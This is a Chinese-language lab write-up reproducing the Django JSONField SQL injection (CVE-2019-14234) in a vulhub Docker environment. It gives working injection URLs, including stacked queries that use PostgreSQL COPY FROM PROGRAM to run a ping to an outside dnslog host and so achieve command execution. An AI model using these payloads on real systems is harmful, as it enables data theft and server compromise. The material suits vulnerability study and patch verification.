Django是一个开放源代码的Web应用框架，由Python写成。采用了MTV的框架模式，即模型M，视图V和模版T。它最初是被开发来用于管理劳伦斯出版集团旗下的一些以新闻内容为主的网站的，即是CMS软件。并于2005年7月在BSD许可证下发布。

该漏洞需要开发者使用了JSONField/HStoreField，且用户可控queryset查询时的键名，在键名的位置注入SQL语句。Django通常搭配postgresql数据库，而JSONField是该数据库的一种数据类型。该漏洞的出现的原因在于Django中JSONField类的实现，Django的model最本质的作用是生成SQL语句，而在Django通过JSONField生成sql语句时，是通过简单的字符串拼接。

## 漏洞影响版本：

> Django 主开发分支
>
> Django 2.2.x < 2.2.4
>
> Django 2.1.x < 2.1.11
>
> Django 1.11.x < 1.11.23

本文仅作漏洞复现记录与实现，利用流程如下:

## 一、漏洞环境

本环境采用vulhub搭建

执行以下命令完成环境搭建

    
    
    cd vulhub/django/CVE-2019-14234/
    
    docker-compose up -d

启动完毕后信息如下

漏洞链接：http://192.168.101.152:8000/

访问如下图所示

![1616763151_605dd90f2f2a8c7417ea4.png!small](https://image.3001.net/images/20210326/1616763151_605dd90f2f2a8c7417ea4.png!small)

首先访问http://192.168.101.152:8000/admin/登录后台，账户密码为admin/a123123123

![1616763279_605dd98f7bf15452413d5.png!small](https://image.3001.net/images/20210326/1616763279_605dd98f7bf15452413d5.png!small)

## 二、利用流程

登录后台后首先访问模型Collection的管理页面

<http://192.168.101.152:8000/admin/vuln/collection/>

添加get参数detail__a'引发sql语句报错，其中detail是模型Collection的JSONField

> http://192.168.101.152:8000/admin/vuln/collection/?detail__a%27

![1616763593_605ddac9d449e53fde961.png!small](https://image.3001.net/images/20210326/1616763593_605ddac9d449e53fde961.png!small)

构造语句

[http://192.168.101.152:8000/admin/vuln/collection/?detail__a%27)%3D%271%27%20or%201%3d1%20--](http://192.168.101.152:8000/admin/vuln/collection/?detail__a%27\)%3D%271%27%20or%201%3D1%20--%20)

由于or 1=1 永远为真，所以返回所有结果

![1616763737_605ddb5965a174e0d0291.png!small](https://image.3001.net/images/20210326/1616763737_605ddb5965a174e0d0291.png!small)

Django一般与PostgreSQL一起配合使用，可以尝试利用PostgreSQL 高权限命令执行漏洞(CVE-2019-9193)

首先访问

[http://192.168.101.152:8000/admin/vuln/collection/?detail__title%27)%3d%271%27%20or%201%3d1%20%3bcreate%20table%20cmd_execs(cmd_output%20text)--%20](http://192.168.101.152:8000/admin/vuln/collection/?detail__title%27\)%3D%271%27%20or%201%3D1%20%3Bcreate%20table%20cmd_execs\(cmd_output%20text\)--%20)

显示no results to fetch，语句已经执行

![1616764052_605ddc94e630616759974.png!small](https://image.3001.net/images/20210326/1616764052_605ddc94e630616759974.png!small)

之后访问

[http://192.168.101.152:8000/admin/vuln/collection/?detail__title%27)%3d%271%27%20or%201%3d1%20%3bcopy%20cmd_execs%20FROM%20PROGRAM%20%27ping%20h7f2ni.dnslog.cn%20%27--%20](http://192.168.101.152:8000/admin/vuln/collection/?detail__title%27\)%3D%271%27%20or%201%3D1%20%3Bcopy%20cmd_execs%20FROM%20PROGRAM%20%27ping%20h7f2ni.dnslog.cn%20%27--%20)

执行命令

![1616764181_605ddd15bf672b868ee71.png!small](https://image.3001.net/images/20210326/1616764181_605ddd15bf672b868ee71.png!small)

可以看到，命令已经成功执行

